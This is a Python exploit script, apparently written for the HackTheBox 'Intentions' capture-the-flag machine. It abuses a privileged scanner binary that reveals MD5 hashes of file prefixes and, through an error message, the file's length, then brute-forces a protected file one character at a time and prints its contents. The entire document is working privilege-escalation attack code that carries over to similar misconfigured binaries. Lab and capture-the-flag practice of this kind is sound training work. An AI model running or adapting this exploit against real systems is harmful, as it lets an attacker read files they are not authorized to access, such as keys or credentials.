"""
Script Name: scansploit.py
Author: Noah Massey
Date: 2024-12-20

Description:
  This script is designed for privilege escalation in the HTB Intentions box.
  It takes the path to the scanner binary and the target file, brute-forces
  the resulting MD5 hash, and outputs the file contents to the console.
  
Usage:
  python scansploit.py </path/to/scanner> </path/to/target/file>

Requirements:
  - Python 3.6+
"""


import hashlib
import subprocess
import string
import sys


"""
Function: getLength
Description: Use the scanner binary stderr to extract the length of the flag
Input: scanner_path, flag_path
Output: flag_length
"""
def getLength(scanner_path, flag_path):

  # Run scanner with an unreasonably large byte number to produce an error
  cmd_output = subprocess.run(
    f'{scanner_path} -c {flag_path} -p -s not-real-hash -l 9999999999',
    shell = True, capture_output = True, text = True)
  cmd_stderr = cmd_output.stderr.split()
  # Extract the real byte length of the file
  flag_length = int(cmd_stderr[cmd_stderr.index('capacity') + 1])
  return flag_length


"""
Function: buildString
Description: Use the scanner binary to extract the hashes and compare to
             self-generated hashes.
Input: scanner_path, flag_path, flag_length
Output: flag
"""
def buildString(scanner_path, flag_path, flag_length):
  valid_chars = list(string.ascii_letters + string.digits)
  flag = ''
  for num in range(0,flag_length):
    # Obtain the hash of the first n characters
    cmd_output = subprocess.run(
      f'{scanner_path} -c {flag_path} -p -s not-real-hash -l {num}',
      shell = True, capture_output = True, text = True)
    cmd_stdout = cmd_output.stdout.split()
    target_hash = cmd_stdout[(cmd_stdout.index('hash') + 1)]
    for char in valid_chars:
      """
      Append each char to the end of a string containing all known
      characters. Then, hash this test string.
      """
      tmp_flag = flag + char
      char_bytes = tmp_flag.encode('utf-8')
      test_hash = hashlib.md5()
      test_hash.update(char_bytes)
      hashed_char = test_hash.hexdigest()
      """
      Compare the test hash with the real hash. If they match, append
      the newly found char to the end of the flag variable.
      """
      if hashed_char == target_hash:
        flag += char
        continue
  return flag


if __name__ == "__main__":
  if len(sys.argv) > 2:
    scanner_path = sys.argv[1]
    flag_path = sys.argv[2]
  else:
    print('Usage: python scansploit.py /path/to/scanner /path/to/flag')
    exit()
  flag_length = getLength(scanner_path,flag_path)
  flag = buildString(scanner_path,flag_path,flag_length)
  print(flag)
